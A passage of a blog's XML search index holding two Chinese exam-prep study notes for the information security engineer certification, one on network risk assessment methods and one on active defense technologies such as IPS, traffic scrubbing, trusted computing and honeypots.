<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>信息安全工程师软考（16）：网络安全风险评估技术</title>
      <link href="/2025/08/21/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88%E8%BD%AF%E8%80%83%EF%BC%8816%EF%BC%89%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0%E6%8A%80%E6%9C%AF/"/>
      <url>/2025/08/21/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88%E8%BD%AF%E8%80%83%EF%BC%8816%EF%BC%89%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0%E6%8A%80%E6%9C%AF/</url>
      
        <content type="html"><![CDATA[<h2 id="网络安全风险评估过程">网络安全风险评估过程</h2><h3 id="网络安全风险评估概述">网络安全风险评估概述</h3><h4 id="定义">定义</h4><ul><li>评估依据：依据信息安全<strong>技术和管理标准</strong>（如等保2.0），对网络系统的保密性©、完整性(I)、可用性(A)等CIA三要素进行综合评价</li><li>核心内容：评估网络系统脆弱性、安全威胁及脆弱性被利用后造成的实际影响，通过<strong>安全事件发生可能性与影响大小确定风险等级</strong></li></ul><h4 id="风险值计算">风险值计算</h4><ul><li>计算公式：风险值﻿<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>R</mi><mo>=</mo><mi>f</mi><mo stretchy="false">(</mo><msub><mi>E</mi><mi>p</mi></msub><mo separator="true">,</mo><msub><mi>E</mi><mi>v</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">R=f(E_p,E_v)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">v</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>﻿，其中﻿<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>E</mi><mi>p</mi></msub></mrow><annotation encoding="application/x-tex">E_p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>﻿为事件发生概率，﻿<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>E</mi><mi>v</mi></msub></mrow><annotation encoding="application/x-tex">E_v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">v</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>﻿为事件损失值</li><li>实例说明：当某攻击事件发生概率为50%（0.5），造成损失50万元时，风险值=﻿<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0.5</mn><mo>×</mo><mn>50</mn><mtext>万</mtext><mo>=</mo><mn>25</mn><mtext>万</mtext></mrow><annotation encoding="application/x-tex">0.5×50万=25万</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">0</span><span class="mord">.</span><span class="mord">5</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">5</span><span class="mord">0</span><span class="mord cjk_fallback">万</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">5</span><span class="mord cjk_fallback">万</span></span></span></span>﻿，属于需重点防范的高风险</li><li>决策参考：风险值计算结果直接决定防护优先级，25万量级风险需立即采取处置措施</li></ul><h4 id="评估要素">评估要素</h4><p>涉及<strong>资产、威胁、脆弱性、安全措施、风险</strong>等各个要素。</p><h4 id="评估模式">评估模式</h4><ul><li><strong>自评估</strong>：由系统所有者自主开展</li><li><strong>检查评估</strong>：监管机构依法开展</li><li><strong>委托评估</strong>：第三方专业机构实施</li><li>模式对比：委托评估专业性最强但成本高，自评估灵活性好但可能缺乏客观性，检查评估具有强制约束力</li></ul><h3 id="网络安全风险评估过程">网络安全风险评估过程</h3><img src="https://image.icewindy.cn/2025/08/8395d87f81f851720a28878d66793ed1.png" alt="image-20250821144150601" style="zoom: 67%;" /><h4 id="1-评估准备与资产识别">1）评估准备与资产识别</h4><ol><li><p>评估准备</p><ul><li>范围要素：包括网络系统拓扑结构、通信协议、地址分配、网络设备、网络服务（如Web/FTP/邮件）、业务信息流程、安全防范措施（防火墙/IDS/监控系统）、操作系统、相关人员及物理环境（机房位置等）</li><li>关键产出：需生成**《网络风险评估范围界定报告》**，该文档是后续工作的基准依据，具有法律效力</li></ul></li><li><p>资产识别</p><ul><li><p>网络资产鉴别：确认网络资产种类和清单，常见的网络资产：<strong>网络设备、主机、服务器、应用、数据和文档资产</strong>。</p></li><li><p>网络资产价值估算</p><ul><li><p>评估本质：不是计算物理经济价值（如设备采购价），而是评估其相对价值，基于CIA三要素（保密性/完整性/可用性）对业务的影响程度</p></li><li><p>典型案例：价值5000元的路由器若故障导致网络中断1天造成10万元损失，则其评估价值为10万元</p></li><li><p>等级划分：国家标准将资产分为5级（1-5级），等级越高对组织影响越严重，5级为灾难性损害，1级为可忽略影响</p><img src="https://image.icewindy.cn/2025/08/b9dcc0563b52e4a6b9ed0a454f4a0ced.png" alt="image-20250821151134197" style="zoom: 50%;" /></li><li><p>资产保密性、完整性和可用性赋值</p><ul><li><p>保密性赋值：</p><img src="https://image.icewindy.cn/2025/08/25d15bba69e45e5e7e195633b327bd7d.png" alt="image-20250821151358554" style="zoom:50%;" /></li><li><p>完整性赋值：</p>  <img src="https://image.icewindy.cn/2025/08/a2313fa450f1c30862f582ef94c688d0.png" alt="image-20250821151438742" style="zoom:50%;" /></li><li><p>可用性赋值：</p>  <img src="https://image.icewindy.cn/2025/08/46945d260c779dbed3777255946d6d1c.png" alt="image-20250821151454247" style="zoom:50%;" /></li><li><p>记忆技巧：CIA三性需联动评估，实际工作中常采用&quot;木桶原理&quot;取最低等级作为最终评级。对于赋值标准，重点掌握5级和1级的典型特征即可覆盖大部分考试场景。</p></li></ul></li></ul></li></ul></li></ol><h4 id="2-威胁识别">2）威胁识别</h4><ul><li>分析维度：从<strong>威胁来源、途径、能力、效果、意图、频率</strong>等多方面进行分析，最终生成威胁列表</li><li>核心任务：标记潜在威胁源，明确网络系统面临的各类威胁能力，包括<strong>自然威胁和人为威胁</strong></li></ul><h5 id="威胁途径">威胁途径</h5><ul><li>典型手段：计算机病毒、特洛伊木马、蠕虫程序、漏洞利用、嗅探工具等</li><li>组合攻击：攻击者往往采用多种方法组合实施威胁</li></ul><h5 id="威胁效果">威胁效果</h5><ul><li>非法访问：破坏系统机密性</li><li>欺骗行为：主要影响系统可控性</li><li>拒绝服务：破坏系统可用性，使合法用户无法获取服务</li></ul><h5 id="威胁意图">威胁意图</h5><ul><li>挑战型：以技术挑战为目的</li><li>情报获取：窃取敏感信息</li><li>恐怖主义：制造社会恐慌</li><li>经济利益：获取非法收益</li><li>报复行为：针对特定目标的打击报复</li></ul><h5 id="威胁频率">威胁频率</h5><ul><li><p>五级划分</p><ul><li>5级（很高）：≥1次/周</li><li>4级（高）：≈1次/月</li><li>3级（中等）：≈1次/半年</li><li>2级（低）：发生概率较小</li><li>1级（很低）：几乎不可能发生</li></ul></li><li><p>评估依据：历史安全事件记录、行业统计报告、监测数据等</p></li></ul><h4 id="3-脆弱性识别">3）脆弱性识别</h4><ul><li><p>脆弱性识别的定义</p><ul><li>本质：发现网络资产中存在的安全缺陷清单</li><li>危害表现：导致非授权访问、信息泄密、系统失控、服务不可用、安全机制被绕过等</li></ul></li><li><p>脆弱性识别的核心与目的</p><ul><li>工作核心：以资产保护为中心，识别可能被利用的弱点</li><li>评估重点：对脆弱性的严重程度进行量化评估</li></ul></li><li><p>脆弱性识别方法</p><ul><li>技术手段：漏洞扫描（使用专业扫描工具）、渗透测试（模拟黑客攻击）</li><li>人工手段：安全检查、问卷调查（适用于大规模调查）、安全访谈（针对关键人员）</li><li>方法选择：实际项目中访谈和渗透测试使用频率较高，问卷调查效果有限</li></ul></li><li><p>脆弱性严重程度的赋值</p><img src="https://image.icewindy.cn/2025/08/fc8812a7735326cfd75ac8c655c2c62d.png" alt="image-20250821152536770" style="zoom:50%;" /></li><li><p>脆弱性评估的分类</p><ul><li>技术评估：检验现有安全技术措施的合理性和有效性</li><li>管理评估：<ul><li>评估内容：组织结构、人员配置、安全意识、培训体系、操作规程、设备管理、应急响应、制度建设等</li><li>评估目的：确认安全策略的实际执行情况</li></ul></li><li>标准关联：与等保2.0标准中的管理要求高度契合</li></ul></li></ul><h4 id="4-已有安全措施确认">4）已有安全措施确认</h4><ul><li>评估对象：已部署的预防性和保护性安全措施（如防火墙、入侵检测系统等）</li><li>评估要点：<ul><li>安全措施能否有效防止脆弱性被利用</li><li>能否抵御已识别的安全威胁</li></ul></li><li>结果应用：效果良好的措施可继续沿用，无需整改</li></ul><h4 id="5-网络安全风险分析">5）网络安全风险分析</h4><img src="https://image.icewindy.cn/2025/08/1e9262dbd5d5b7c1e55ecb6697187fd9.png" alt="image-20250821152740812" style="zoom:50%;" /><p>分析基础：在资产评估、威胁评估、脆弱性评估、安全管理评估、安全影响评估基础上，综合运用<strong>定性和定量</strong>分析方法，确定<strong>风险大小与风险等级</strong></p><h4 id="6-风险处置与管理">6）风险处置与管理</h4><ul><li>风险处置的目标与计划制定<ul><li>处置目标：针对不可接受风险制定处理计划，降低系统风险</li><li>计划要素：<ul><li>具体安全措施（技术/管理）</li><li>预期效果量化指标</li><li>实施条件与进度安排</li><li>明确责任部门</li></ul></li></ul></li><li>网络安全风险管理的控制措施概述<ul><li>十大控制措施：<ul><li>制定安全策略与建立安全组织（对应等保2.0安全管理机构）</li><li>网络资产分类管理（如敏感数据分级）</li><li>人员安全管理（等保2.0安全管理人员要求）</li><li>物理与环境安全（门禁、监控等）</li><li>安全通信保障（数据传输加密）</li><li>访问控制机制（权限管理）</li><li>系统开发与维护安全（SDL流程）</li><li>业务持续性管理（灾备方案）</li><li>合规性管理（符合法律法规）</li><li>安全目标一致性检查</li></ul></li></ul></li></ul><h2 id="网络安全风险评估技术方法与工具">网络安全风险评估技术方法与工具</h2><h3 id="1-资产信息收集">1）资产信息收集</h3><ul><li>实施方式: 通过<strong>调查表形式</strong>收集网络信息系统资产信息，掌握重要资产分布情况</li><li>分析维度:<ul><li>资产关联的业务系统</li><li>面临的安全威胁</li><li>存在的安全脆弱性</li></ul></li></ul><h3 id="2-网络拓扑发现">2）网络拓扑发现</h3><ul><li>常用工具:<ul><li>ping命令</li><li>traceroute命令</li><li>网络管理综合平台</li></ul></li><li>应用价值:<ul><li>通过拓扑图直观展示资产分布</li><li>清晰呈现设备间关联关系</li><li>工程师需具备拓扑图阅读和绘制能力</li></ul></li></ul><h3 id="3-网络安全漏洞扫描">3）网络安全漏洞扫描</h3><ul><li>扫描方式: 自动化工具扫描</li><li>扫描内容:<ul><li>系统版本信息</li><li>开放端口及对应服务（如23端口对应telnet，80端口对应web）</li><li>存在的安全漏洞</li><li>密码算法强度</li><li>弱口令分布情况</li></ul></li></ul><h3 id="4-人工检查">4）人工检查</h3><ul><li>实施步骤:<ul><li>预先设计<strong>检查表(CheckList)</strong></li><li>按表逐项核查</li></ul></li><li>检查对象:<ul><li>网络结构</li><li>网络设备</li><li>服务器/客户机</li></ul></li><li>记录要求: 所有检查操作必须形成<strong>书面的记录材料</strong></li></ul><h3 id="5-渗透测试">5）渗透测试</h3><ul><li>核心特征: 获得法律授权后模拟黑客攻击</li><li>主要目的:<ul><li>发现安全漏洞</li><li>构建攻击路径</li><li>验证漏洞可利用性</li></ul></li></ul><h3 id="6-问卷调查-访谈">6）问卷调查、访谈</h3><p><strong>问卷调查</strong></p><ul><li>实施形式: 书面问卷</li><li>调查对象: 信息系统相关人员</li><li>调查目的: 获取系统基本安全状况信息</li></ul><p><strong>访谈</strong></p><ul><li>参与人员:<ul><li>安全专家</li><li>系统使用人员</li><li>管理人员</li></ul></li><li>访谈内容:<ul><li>安全策略实施情况</li><li>规章制度执行情况</li><li>技术管理现状</li></ul></li></ul><h3 id="7-审计数据分析">7）审计数据分析</h3><ul><li>技术手段:<ul><li>数据统计</li><li>特征模式匹配</li></ul></li><li>数据来源:<ul><li>终端安全软件(如EDR)</li><li>网络设备(IDS/IPS)</li><li>上网行为管理系统</li></ul></li></ul><h3 id="8-入侵监测">8）入侵监测</h3><ul><li>实施方式: 部署入侵监测软件/设备</li><li>典型代表: IDS(入侵检测系统)</li><li>监测内容:<ul><li>威胁特征信息</li><li>系统安全状态</li></ul></li></ul><h2 id="网络安全风险评估项目流程与工作内容">网络安全风险评估项目流程与工作内容</h2><h3 id="评估工程前期准备">评估工程前期准备</h3><ul><li>核心要素：包括确定评估对象、范围界定、评估粒度和时间等具体需求目标</li><li>法律保障：<strong>必须签订合同和保密协议</strong>，特别是涉及渗透测试等攻击性方法时，保密协议可避免法律纠纷</li><li>组织架构：需成立评估工作组，并选择评估模式（客户自评/上级部门评估/第三方专业机构评估）</li></ul><h3 id="评估方案设计与论证">评估方案设计与论证</h3><ul><li>设计依据：根据被评估方的安全需求制定，需包含评估方法、人员组织、工具选择、风险分析和实施计划</li><li>论证流程：需组织双方讨论，听取各方意见后修改方案直至通过论证</li><li>关键要求：确保方案可行性，所有修改必须记录在案</li></ul><h3 id="评估方案实施">评估方案实施</h3><ul><li>实施步骤：包括基本情况调查、安全需求挖掘和具体操作步骤确定</li><li>操作规范：<ul><li>避免改变系统设置，必要时需备份原配置</li><li>必须<strong>书面记录操作过程和相关数据</strong></li><li>敏感系统测试需<strong>至少两人参与且领导签字批准</strong></li></ul></li><li>文档要求：工作备忘录需包含环境描述、操作记录、问题分析和测试数据</li></ul><h3 id="评估报告撰写">评估报告撰写</h3><ul><li>数据基础：依据资产评估数据、威胁评估数据和脆弱性评估数据</li><li>核心价值：是风险管理的主要依据和评审基础，必须做到有据可查</li><li>标准结构：包含绪论、安全现状、资产评估、脆弱性评估、安全管理评估、总结建议等</li><li>关键内容：需明确风险评估范围、计算方法、安全问题描述、风险级数及安全建议</li></ul><h3 id="评估结果评审与认可">评估结果评审与认可</h3><ul><li>评审形式：通常以PPT汇报形式进行，由项目负责人向客户领导层汇报</li><li>验收标准：需最高管理层或其委托机构召开结束会议进行验收</li><li>文档归档：评估数据、方案、报告等需备案处理</li></ul>]]></content>
      
      
      <categories>
          
          <category> 软考 </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软考 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息安全工程师软考（15）：网络安全主动防御技术</title>
      <link href="/2025/08/20/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88%E8%BD%AF%E8%80%83%EF%BC%8815%EF%BC%89%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%BB%E5%8A%A8%E9%98%B2%E5%BE%A1%E6%8A%80%E6%9C%AF/"/>
      <url>/2025/08/20/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88%E8%BD%AF%E8%80%83%EF%BC%8815%EF%BC%89%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%BB%E5%8A%A8%E9%98%B2%E5%BE%A1%E6%8A%80%E6%9C%AF/</url>
      
        <content type="html"><![CDATA[<h2 id="入侵阻断技术">入侵阻断技术</h2><h3 id="入侵阻断-ips-概念">入侵阻断（IPS）概念</h3><ul><li>本质特征：属于网络安全主动防御技术，通过阻断网络攻击行为来保护目标对象</li><li>与IDS关系：入侵检测系统（IDS）的扩展升级版，商业产品常将两者集成（如IPS同时具备检测和阻断功能）</li><li>核心功能：既能检测攻击特征又能实时阻断攻击流量，工作机制类似路由器或防火墙</li><li>IPS具备防火墙和入侵检测等多种功能</li><li>由于大多串行部署，IPS需要解决网络<strong>通信瓶颈和高可用问题</strong>。</li></ul><h3 id="ips部署">IPS部署</h3><ul><li>商用IPS主要采用硬件设备实现，通常串行部署在网络主干，或者<strong>基于旁路阻断</strong></li><li>旁路阻断（SPS，Side Prevent System）：<ul><li>通过旁路监测流量，采用报文注入技术阻断攻击</li><li>需配合策略路由或SDN控制器进行流量牵引</li><li>优势：仅检测特定流量，对网络延迟影响较小</li></ul></li><li>部署选择：关键业务系统推荐串行部署，大流量环境可采用旁路部署+智能引流方案</li></ul><h2 id="软件白名单技术">软件白名单技术</h2><h3 id="技术方法">技术方法</h3><ul><li>移动生态构建（合规软件下载平台）：<ul><li>建立三级审查流程（初审→复审→终审）</li><li>设置7个工作日的公示期+正式发布阶段</li></ul></li><li>恶意代码防护：<ul><li>传统黑名单：依赖病毒特征库，难以防范零日漏洞攻击</li><li>白名单优势：仅允许安装/执行经过认证的可信软件</li></ul></li><li>白环境保护：<ul><li>三重控制：<strong>可信设备接入+可信消息传输+可信软件执行</strong></li></ul></li></ul><h3 id="技术原理">技术原理</h3><img src="https://image.icewindy.cn/2025/08/3c4001de4ad438547d9249f93c886729.png" alt="image-20250820150437805" style="zoom:67%;" /><h2 id="网络流量清洗技术">网络流量清洗技术</h2><h3 id="技术原理">技术原理</h3><p>通过<strong>异常网络流量检测</strong>，而将原本发送给目标设备系统的<strong>流量牵引到流量清洗中心</strong>，清洗完毕后再将留存的<strong>正常流量转送到目标设备系统</strong>，包含三个步骤：</p><ol><li>流量检测：<ul><li>核心技术：采用分布式多核硬件架构，基于深度数据包检测技术(DPI)实现</li><li>检测原理：通过实时监测和分析网络流量数据，快速识别隐藏在背景流量中的攻击包</li><li>精准识别：能有效区分正常流量与攻击流量，为后续清洗提供准确依据</li></ul></li><li>流量牵引与清洗：<ul><li>核心功能：动态将目标系统流量转发到专用清洗中心进行处理</li><li>典型应用：特别针对大规模DDoS攻击</li></ul></li><li>流量回注：将清洗后的正常流量重新送回目标系统</li></ol><h3 id="流量清洗抗拒绝服务攻击应用示意图">流量清洗抗拒绝服务攻击应用示意图</h3><img src="https://image.icewindy.cn/2025/08/6501e31a8e6fb6316b5f291d4af8af1a.png" alt="image-20250820152108116" style="zoom:50%;" /><h3 id="网络流量清洗技术应用">网络流量清洗技术应用</h3><ul><li>畸形数据报文过滤<ul><li>LAND攻击：伪造源目相同IP的SYN包，使目标与自己建立TCP空连接消耗资源</li><li>Smurf攻击：假冒目标IP向广播地址发ping请求，引发大量ICMP回复发送至目标</li><li>Fraggle攻击：类似Smurf但使用UDP协议</li><li>WinNuke攻击：攻击135-139端口并设置URG标志位</li><li>Ping of Death：发送超过65535字节的IP分片包导致系统崩溃</li><li>Tear Drop：针对IP分组攻击，将片偏移设置为错位</li><li>TCP Error Flag：将TCP的标志位错误设置</li></ul></li><li>抗拒绝服务攻击</li><li>Web应用保护<ul><li>HTTP Get/Post Flood：高频请求淹没服务器</li><li>HTTP Slow Header/Post：慢速连接消耗服务器资源</li><li>HTTPS Flood：加密请求增加服务器计算负担</li></ul></li><li>DDoS高防IP服务<ul><li>工作原理：采用代理转发模式，业务流量先经高防IP过滤</li><li>服务优势：云服务商提供的专业防护，无需自建清洗设施</li><li>处理流程：流量牵引→攻击过滤→正常流量回注源站</li></ul></li></ul><h2 id="可信计算技术">可信计算技术</h2><ul><li><p>发展历程：1999年成立TCPA“可信计算平台联盟”，2003年更名为TCG“可信计算组织”，制定了<strong>TPM（Trusted Platform Module）和TNC（Trusted Network Connect）标准</strong>。</p></li><li><p>核心思想：通过<strong>安全芯片（TPM）建立信任根</strong>，从<strong>硬件、BIOS、操作系统</strong>等逐层验证完整性，防止篡改计算组件。</p><img src="https://image.icewindy.cn/2025/08/bd370a01235e2b598c9dc34bcecf2acc.png" alt="image-20250820161638787" style="zoom:67%;" /></li><li><p>解释：确保计算设备(PC/服务器)从芯片到应用软件全链条可信，任何环节篡改都会导致系统无法运行。</p></li></ul><h3 id="可信计算系统">可信计算系统</h3><ul><li>四层架构：<ul><li>可信根：TPM安全芯片作为信任基础</li><li>硬件平台</li><li>操作系统</li><li>应用系统</li></ul></li><li>三个信任根：<ul><li>RTM：可信度量根（启动时逐级校验）</li><li>RTS：可信存储根（密码学相关）</li><li>RTR：可信报告根（完整性报告）</li></ul></li></ul><h3 id="自主可信计算标准体系">自主可信计算标准体系</h3><img src="https://image.icewindy.cn/2025/08/5a5f7cbaf58cc9801c7215d387d3c7ee.png" alt="image-20250820162311551" style="zoom: 67%;" /><ul><li>可信计算密码支撑平台组件：<ul><li>可信密码模块（TCM）：替代TPM芯片，三个可信根</li><li>TCM服务模块（TSM）</li></ul></li><li>特点：基于自主密码算法，通过三个信任根实现平台完整性验证、身份认证和数据保护。</li></ul><h3 id="可信计算的应用">可信计算的应用</h3><ul><li><p>计算平台保护：</p><ul><li><p>利用TPM/TCM安全芯片对计算平台的关键组件进行<strong>完整性度量和检查</strong></p></li><li><p>启动时校验BIOS/系统组件</p></li><li><p>运行时实时检测内存等硬件变更</p></li></ul></li><li><p>可信网络连接(TNC)：</p><ul><li>利用TPM/TCM安全芯片实现平台<strong>身份认证和完整性验证</strong></li></ul></li><li><p>等保2.0要求：</p><ul><li>对设备引导程序、关键参数进行动态验证</li><li>高安全等级系统需验证应用程序执行环节</li><li>采用主动免疫机制阻断恶意代码</li></ul></li></ul><h2 id="数字水印技术">数字水印技术</h2><h3 id="技术原理">技术原理</h3><ul><li><p>嵌入方法：</p><ul><li>空间域：直接叠加</li><li>变换域：采用扩展频谱技术或Hash函数</li></ul></li><li><p>工作流程：</p><img src="https://image.icewindy.cn/2025/08/26f48670f788e09d525a1f5f37806399.png" alt="image-20250820163215330" style="zoom:50%;" /><ul><li>嵌入：原始载体+水印→水印算法→含水印载体</li><li>提取：含水印载体→提取算法→分离出水印和原始载体</li></ul></li></ul><h3 id="应用">应用</h3><ul><li>版权保护：嵌入版权信息</li><li>信息隐藏：将敏感数据隐藏在多媒体中</li><li>信息溯源：嵌入用户ID防止文档泄露</li><li>访问控制：通过检测水印判断访问权限</li></ul><h2 id="网络攻击陷阱技术">网络攻击陷阱技术</h2><ul><li>主动防御特性: 属于<strong>主动防御方法</strong>，核心是通过设置虚假系统诱导攻击（选择题考点1分）</li><li>核心功能:<ul><li>消耗攻击者资源</li><li>加重攻击工作量</li><li>迷惑攻击者</li><li>预判攻击行为</li><li>追踪攻击源</li><li>形成威慑力量</li></ul></li><li>技术分类: 蜜罐主机技术（单点诱骗）和陷阱网络技术（体系化诱骗）</li></ul><h3 id="蜜罐技术">蜜罐技术</h3><ul><li>空系统:<ul><li>标准硬件配置</li><li>运行完整真实操作系统</li><li>无网络服务（如邮件/Web）</li><li>类似普通PC环境</li></ul></li><li>镜像系统:<ul><li>完整复制生产系统</li><li>包含全部应用服务</li><li>实现高仿真诱骗</li></ul></li><li>虚拟系统:<ul><li>单物理机运行仿真软件（如VMware/VirtualBox）</li><li>可虚拟多操作系统（Linux/Windows/BSD等）</li></ul></li></ul><h3 id="陷阱网络技术">陷阱网络技术</h3><p>陷阱网络由<strong>多个蜜罐主机、路由器、防火墙、IDS、审计系统</strong>共同组成。目的是为攻击者制造一个攻击环境，供防御者研究攻击者的攻击行为。</p><p>陷阱网络要实现<strong>蜜罐系统、数据控制系统、数据捕获系统、数据记录、数据分析、数据管理</strong>等功能。</p><ul><li><p>第一代:</p><img src="https://image.icewindy.cn/2025/08/f280291a1b010a49c6084561be1b1938.png" alt="image-20250820165750470" style="zoom:80%;" /><ul><li>完整<strong>物理网络</strong>架构</li><li>包含独立防火墙/路由器/IDS</li><li>多蜜罐主机分布式部署</li></ul></li><li><p>第二代:</p><p><img src="https://image.icewindy.cn/2025/08/06879ffd937158625f4ee06cc6586c7e.png" alt="image-20250820165810549"></p><ul><li><strong>集成数据控制与捕获系统</strong></li><li>三大优势：<ul><li>非授权活动监控</li><li>隐蔽性增强</li><li>主动响应能力（如修改攻击代码字节）</li></ul></li></ul></li><li><p>第三代（虚拟陷阱网络Virtual Honeynets）:</p>  <img src="https://image.icewindy.cn/2025/08/30794f8e76c627a3bbe89a072f871259.png" alt="image-20250820165828595" style="zoom:80%;" /><ul><li>全功能<strong>集成单设备</strong></li><li>实现：<ul><li>蜜罐系统虚拟化</li><li>集中式数据控制</li><li>自动化攻击捕获</li><li>智能行为分析</li></ul></li></ul></li></ul><h3 id="应用">应用</h3><ul><li>恶意代码监测:<ul><li>分析蜜罐节点流量</li><li>检测隐蔽通信</li><li>发现APT攻击特征</li></ul></li><li>增强抗攻击能力:<ul><li>改变攻防不对称局面</li><li>虚假目标干扰攻击</li><li>为应急响应争取时间</li></ul></li><li>网络态势感知:<ul><li>结合大数据分析</li><li>获取攻击者情报（方法/特征/来源）</li></ul></li></ul><h2 id="入侵容忍及系统生存技术">入侵容忍及系统生存技术</h2><h3 id="概念">概念</h3><ul><li>核心理念：允许系统在被入侵后仍能维持核心功能运行，确保网络信息系统具有<strong>容侵能力、可恢复性，保障业务连续性</strong></li><li>安全理念演进：<ul><li>1.0时代：防火墙等边界防御（“把入侵者挡在防火墙之外”）</li><li>2.0时代：IPS等威胁检测与隔离（“在内部做检测阻断”）</li><li>3.0时代：容忍入侵并实现系统恢复（“数据可恢复，系统不瘫痪”）</li></ul></li><li>生存性3R方法：<ul><li>系统划分：<strong>不可攻破的安全核+可恢复部分</strong></li><li>核心策略：<strong>抵抗(Resistance)、识别(Recognition)、恢复(Recovery)</strong></li><li>基本假设：<strong>基础服务不可攻破、入侵模式有限集、需维持攻防动态平衡</strong></li></ul></li><li>关键技术：<ul><li>分布式共识：关键组件分布式部署</li><li>主动恢复：实时检测异常并主动修复</li><li>门限密码：分散存储密码，将私钥﻿<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi></mrow><annotation encoding="application/x-tex">d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">d</span></span></span></span>﻿分解为﻿<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mo>=</mo><msub><mi>d</mi><mn>1</mn></msub><mo>+</mo><msub><mi>d</mi><mn>2</mn></msub><mo>+</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo>+</mo><msub><mi>d</mi><mi>t</mi></msub></mrow><annotation encoding="application/x-tex">d=d_1+d_2+...+d_t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">d</span><span class="mspace" 